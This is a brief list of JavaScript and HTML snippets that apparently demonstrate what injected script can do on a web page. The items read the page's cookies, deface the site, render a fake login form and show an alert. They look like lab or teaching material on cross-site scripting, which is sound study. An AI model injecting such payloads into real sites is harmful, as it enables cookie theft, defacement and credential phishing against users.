1. Stealing Cookies
    document.getElementById('cookieOutput').innerText=document.cookie;

2. Modify website content
    document.body.innerHTML = '<h1>This site has been hacked</h1>';

3. Fake Login Form
    <form id="loginForm">
        <h2>Login</h2>
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <button type="submit">Submit</button>
    </form>

3. Alerts
    alert('Thank you for evaluating!')

